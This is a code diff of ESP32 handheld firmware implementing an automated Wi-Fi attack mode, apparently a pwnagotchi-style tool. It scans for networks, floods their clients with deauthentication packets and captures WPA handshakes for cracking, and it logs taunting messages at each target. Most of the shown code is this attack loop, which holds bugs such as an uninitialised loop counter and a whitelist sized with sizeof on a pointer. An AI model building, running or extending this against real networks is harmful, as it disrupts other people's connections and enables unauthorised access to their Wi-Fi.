@@ -7,44 +7,12 @@
 #include "networkKit.h"
 #include "EapolSniffer.h"
 #include "ui.h"
-#include "src.h"
 
 String pwnagothiWhitelist[30];
 String pwnagothiMacWhitelist[30];
+bool pwnagothiModeEnabled;
 bool pwnagothiScan = true;
 bool nextWiFiCheck = false;
-
-TaskHandle_t pwnagothiTaskHandle = NULL;
-
-void pwnagothiTask(void *pvParameters) {
-    while (pwnagothiModeEnabled) {
-        pwnagothiLoop();
-    }
-    vTaskDelete(NULL);
-}
-
-void startPwnagothiTask() {
-    if (pwnagothiTaskHandle == NULL) {
-        pwnagothiModeEnabled = true;
-        xTaskCreatePinnedToCore(
-            pwnagothiTask,      // Task function
-            "PwnagothiTask",    // Name
-            8192,               // Stack size
-            NULL,               // Parameters
-            1,                  // Priority
-            &pwnagothiTaskHandle, // Task handle
-            1                   // Core 1
-        );
-    }
-}
-
-void stopPwnagothiTask() {
-    if (pwnagothiTaskHandle != NULL) {
-        pwnagothiModeEnabled = false;
-        vTaskDelete(pwnagothiTaskHandle);
-        pwnagothiTaskHandle = NULL;
-    }
-}
 
 bool pwnagothiBegin(){
     if(!(WiFi.mode(WIFI_MODE_STA) && WiFi.scanNetworks(true, true))){
@@ -126,22 +94,25 @@ void pwnagothiLoop(){
     if(pwnagothiScan){
         logMessage("(<_>) Scanning..");
         setMood(1, "(<_>)", "Scanning..");
+        updateUi(true, false);
         WiFi.scanNetworks(false);
-        delayWithUI(5000);
+        delayWithUI(50);
         if((WiFi.scanComplete()) >= 0){
             wifiCheckInt = 0;
             pwnagothiScan = false;
             logMessage("(*_*) Scan compleated proceding to attack!");
             setMood(1, "(*_*)", "Scan compleated proceding to attack!");
-            delayWithUI(1000);
-            return;
+            updateUi(true, false);
+            delayWithUI(100);
+            //return;
         }
     }
     else{
         String attackVector;
         if(!WiFi.SSID(0)){
             logMessage("('_') No networks found. Waiting and retrying");
-            delayWithUI(5000);
+            updateUi(true, false);
+            delayWithUI(50);
             pwnagothiScan = true;
         }
         if(wifiCheckInt < WiFi.scanComplete()){
@@ -154,7 +125,8 @@ void pwnagothiLoop(){
         attackVector = WiFi.SSID(wifiCheckInt);
         setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
         logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
-        delayWithUI(1000);
+        updateUi(true, false);
+        delayWithUI(10);
         String* whitelistParsed = parseWhitelist();
         logMessage("Size of whiletist: " + String(sizeof(whitelistParsed)));
         for(uint16_t i = 0; i<=sizeof(whitelistParsed); i++){
@@ -162,12 +134,14 @@ void pwnagothiLoop(){
             if(whitelistParsed[i] == attackVector){
                 setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                 logMessage("(x_x) " + String("Well, ") + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
-                delayWithUI(5000);
+                updateUi(true, false);
+                delayWithUI(50);
                 wifiCheckInt++;
                 return;
             }
         }
         setMood(1, "(Y_Y)" , "I'm looking instde you " + attackVector + "...");
+        updateUi(true, false);
         set_target_channel(attackVector.c_str());
         uint8_t i = 1;
         uint8_t currentCount = SnifferGetClientCount();
@@ -176,67 +150,84 @@ void pwnagothiLoop(){
         initClientSniffing();
         String clients[50];
         int clientLen;
+        unsigned long startTime = millis();
+        logMessage("Waiting for clients to connect to " + attackVector);
         while(true){
             get_clients_list(clients, clientLen);
+            if (millis() - startTime > 20000) { // 20 seconds timeout
+                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
+                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
+                SnifferEnd();
+                updateUi(true, false);
+                break;
+            }
             if(clients[i] != ""){
                 logMessage("Client count: " + String(clientLen));
                 setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
                 logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
                 logMessage("Client BSSID is: "+ clients[clientLen]);
                 logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
-                delayWithUI(2000);
+                updateUi(true, false);
+                delayWithUI(20);
                 //stopClientSniffing();
                 esp_wifi_set_promiscuous(false);
                 break;
             }
+            updateUi(true, false);
         }
         setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
         logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
+        updateUi(true, false);
         if(send_deauth_packets(clients[i], 200)){
             logMessage("Deauth succesful");
         }
         else{
             logMessage("Unknown error with deauth");
         }
-        if(SnifferBegin(targetChanel)){
-            logMessage("Sniffer started on channel: " + String(targetChanel));
-        }
-        else{
-            logMessage("Sniffer failed to start on channel: " + String(targetChanel));
-            setMood(1, "(x_x)", "Sniffer failed to start on channel: " + String(targetChanel));
-            delayWithUI(5000);
-            return;
-        }
+        unsigned long startTime1 = millis();
+        SnifferBegin(targetChanel);
         while(true){
             SnifferLoop();
-            if(SnifferGetClientCount() > currentCount){
+            if (millis() - startTime1 > 20000) { // 20 seconds timeout
+                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
+                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
+                SnifferEnd();
+                updateUi(true, false);
+                break;
+            }
+            updateUi(true, false);
+            delayWithUI(10);
+            if (SnifferGetClientCount() > currentCount) {
                 setMood(1, "(^_^)", "Got new handshake!!!" );
                 logMessage("(^_^) Got new handshake!!!");
                 SnifferEnd();
+                updateUi(true, false);
                 addToWhitelist(attackVector);
                 pwned_ap++;
                 sessionCaptures++;
                 saveSettings();
-                updateActivity(true);
                 break;
             }
         }
     }
+    setMood(1, "(>_<)", "Waiting 3 seconds for next attack...");
+    logMessage("(>_<) Waiting 3 seconds for next attack...");
+    updateUi(true, false);
+    delayWithUI(30);
 }
 
 void delayWithUI(uint16_t delayTime){
-    delay(delayTime);
-    // for(uint16_t timer; timer>=delayTime; timer = timer +10){
-    //     updateUi(true, false);
-    //     delay(10);
-    // }
-    //  /\
-    //  |
-    //Deprecated, but kept because I am lazy to remove it
+    logMessage("Waiting " + String(delayTime) + "ms");
+    for(uint16_t timer; timer<=delayTime; timer++){
+        M5.update();
+        M5Cardputer.update();
+        sleepFunction();
+        updateUi(true, false);
+        delay(1);  // Delay for 1 ms to avoid blocking the UI
+    }
 }
 
 void removeItemFromWhitelist(String valueToRemove) {
-    logMessage("Removing item from whitelist: " + valueToRemove);
     JsonDocument oldList;
     deserializeJson(oldList, whitelist);
     JsonDocument list;
@@ -252,6 +243,4 @@ void removeItemFromWhitelist(String valueToRemove) {
     
     serializeJson(list, whitelist);
     saveSettings();
-    initVars(); // Reinitialize variables to reflect changes
-    logMessage("Item removed from whitelist: " + valueToRemove);
 }
